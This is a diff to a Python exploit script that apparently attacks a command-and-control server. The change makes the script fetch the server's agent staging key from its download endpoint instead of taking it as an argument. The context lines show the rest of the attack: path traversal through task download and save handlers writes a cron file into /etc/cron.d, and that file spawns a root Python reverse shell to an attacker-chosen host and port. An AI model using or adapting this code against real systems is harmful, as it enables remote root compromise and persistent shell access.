@@ -1,4 +1,5 @@
 import os
+import re
 import random
 import string
 import struct
@@ -25,8 +26,8 @@ SERVER_RESPONSE = 6
 cron_payload = "* * * * * root /usr/bin/python -c 'import socket, subprocess, os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"IP\", PORT)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); p=subprocess.call([\"/bin/sh\", \"-i\"]);'\n\n"
 
 class Agent:
-    def __init__(self,session_key,server,language,session_id=None,taskURIs=None,hostname=":^)"):
-        self.sk = session_key
+    def __init__(self,server,language,staging_key=None,session_id=None,taskURIs=None,hostname=":^)"):
+        self.sk = staging_key
         self.server = server
         self.language = language
         self.taskURIs = taskURIs
@@ -96,6 +97,10 @@ class Agent:
 
 
     def stage(self, stage0=False):
+        #Recover staging key
+        r = requests.get(self.server+'/download/python')
+        self.sk = re.search('key=IV\+\'(.*)\'\.encode',r.text).group(1)
+        print('Recovered staging key '+self.sk)
         #stage0 - This is not necessary. Leaving in 
         if stage0:
             session_id = b'00000000'
@@ -167,8 +172,6 @@ def cmdline_args():
     p = argparse.ArgumentParser(prog='rotj', description=description,
       formatter_class=argparse.RawDescriptionHelpFormatter)
   
-    p.add_argument("staging_key",
-                   help="The agent staging key.")
     p.add_argument("target", type=str,
                    help="The target C2 server address.")
     p.add_argument("lhost", type=str,
@@ -185,7 +188,7 @@ if __name__ == '__main__':
 
     # TASK_DOWNLOAD 
     def task_download(write_path="\\etc\\cron.d\\evil"):
-        agent = Agent(args.staging_key.encode(),args.target, PYTHON)
+        agent = Agent(args.target, PYTHON)
 
         tr = "..\\"*50
         path = tr + write_path
@@ -195,7 +198,7 @@ if __name__ == '__main__':
     # TASK_CMD_WAIT_SAVE - Requires at least two responses within the same second. The first creates a directory 
     #  in cron.d which meets the save_path.exists() condition and allows us to write to the parent dir.
     def task_cmd_wait_save():
-        agent = Agent(args.staging_key.encode(),args.target, PYTHON, hostname="../"*50+"etc/cron.d/")
+        agent = Agent(args.target, PYTHON, hostname="../"*50+"etc/cron.d/")
         threading.Thread(agent.save_mod_wait(cron_payload.replace("IP",args.lhost).replace("PORT",str(args.lport)))).start()
         threading.Thread(agent.save_mod_wait(cron_payload.replace("IP",args.lhost).replace("PORT",str(args.lport)))).start()
         threading.Thread(agent.save_mod_wait(cron_payload.replace("IP",args.lhost).replace("PORT",str(args.lport)))).start()
